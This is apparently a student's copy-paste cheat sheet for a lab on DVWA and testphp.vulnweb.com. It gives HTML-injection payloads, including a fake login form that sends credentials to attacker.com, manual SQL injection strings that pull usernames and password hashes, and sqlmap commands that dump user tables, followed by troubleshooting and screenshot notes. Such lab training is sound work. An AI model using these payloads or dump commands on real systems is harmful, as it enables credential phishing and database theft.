@@ -1,0 +1,152 @@
+=====================================================================
+ DVWA LAB - COPY PASTE CHEAT SHEET
+ Test everything on DVWA (localhost) or testphp.vulnweb.com only.
+=====================================================================
+
+
+---------------------------------------------------------------------
+ PART A : HTML INJECTION   ->  DVWA menu -> XSS (Reflected)
+---------------------------------------------------------------------
+
+First test (proof the input comes back) :
+A
+
+Then paste these ONE BY ONE in the "What's your name?" box and Submit :
+
+<h1>test</h1>
+
+<marquee>Hacked</marquee>
+
+<img src="https://miro.medium.com/max/400/0*y2OAF_DSarBAjihO.jpg">
+
+<a href="http://example.com">Click here to win a prize</a>
+
+<iframe src="http://example.com" width="600" height="400"></iframe>
+
+Fake login form (best demo) :
+
+<form action="http://attacker.com/steal.php"><h2>Session expired. Please login again</h2><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><input type="submit" value="Login"></form>
+
+NOTE: if DVWA Security is not LOW, these will just show as text.
+      DVWA Security -> Low -> Submit
+
+
+---------------------------------------------------------------------
+ PART B : SQL INJECTION - MANUAL   ->  DVWA menu -> SQL Injection
+---------------------------------------------------------------------
+
+Paste in the text box and click Submit, in this order :
+
+1
+
+1'
+
+' OR 1=1 #
+
+' OR '1'='1
+
+' UNION SELECT user, password FROM users #
+
+' UNION SELECT version(), database() #
+
+1' UNION SELECT user, password FROM users #
+
+1
+
+Expected results:
+1                     -> one normal record
+1'                    -> SQL syntax error  (vulnerable!)
+' OR 1=1 #            -> ALL users listed  (login bypass logic)
+' UNION SELECT ...    -> DVWA usernames + password hashes
+
+
+---------------------------------------------------------------------
+ PART C : SQL INJECTION - SQLMAP on testphp.vulnweb.com
+---------------------------------------------------------------------
+
+Step 1 : list databases
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
+
+  Answer the prompts:
+    skip test payloads for other DBMSes ?        -> Y
+    include all tests for MySQL ?                -> N
+    keep testing other parameters ?              -> N
+
+Step 2 : list tables of database acuart
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+
+Step 3 : list columns of table users
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+
+Step 4 : dump the table
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
+
+  Answer the prompts:
+    store hashes to a temporary file ?           -> N
+    crack them via dictionary attack ?           -> N
+
+FAST MODE (no questions at all) - add  --batch  at the end :
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --batch
+
+Extra info commands :
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --current-db --current-user --banner --batch
+
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname,pass --dump --batch
+
+
+---------------------------------------------------------------------
+ PART D : SQLMAP ON YOUR OWN DVWA  (works even with no internet)
+---------------------------------------------------------------------
+
+1) Open DVWA -> SQL Injection -> type 1 -> Submit
+2) Press F12 -> Application / Storage -> Cookies -> copy PHPSESSID
+
+3) Paste (replace PASTE_SESSION_ID_HERE) :
+
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" --dbs --batch
+
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" -D dvwa --tables --batch
+
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" -D dvwa -T users -C user,password --dump --batch
+
+
+---------------------------------------------------------------------
+ TROUBLESHOOTING
+---------------------------------------------------------------------
+
+http://localhost/DVWA  -> 404          -> folder must be /var/www/html/DVWA (capital letters)
+                                         check: ls /var/www/html
+"Could not connect to the database"    -> sudo systemctl start mariadb
+                                         then re-run PART "Create database" commands
+"mysqli not installed"                 -> sudo apt install php-mysqli -y
+                                         sudo systemctl restart apache2
+Login fails                            -> run setup.php -> Create / Reset Database
+Payloads shown as plain text           -> DVWA Security is not LOW
+sqlmap: "parameter is not injectable"  -> for DVWA you forgot --cookie / session expired
+git: command not found                 -> sudo apt install git -y
+Page not updating                      -> Ctrl + Shift + R (hard refresh)
+
+
+---------------------------------------------------------------------
+ SCREENSHOTS TO TAKE FOR THE JOURNAL
+---------------------------------------------------------------------
+
+1  http://localhost  (Apache default page)
+2  setup.php  with the database row GREEN
+3  login page with admin/password
+4  DVWA Security = Low
+5  <h1>test</h1>  rendered as a heading
+6  <marquee>Hacked</marquee>
+7  <img src=...> external image loaded
+8  fake login form rendered
+9  ' OR 1=1 #   -> all users listed
+10 sqlmap --dbs output
+11 sqlmap --tables output
+12 sqlmap --columns output
+13 sqlmap --dump output (usernames + passwords)
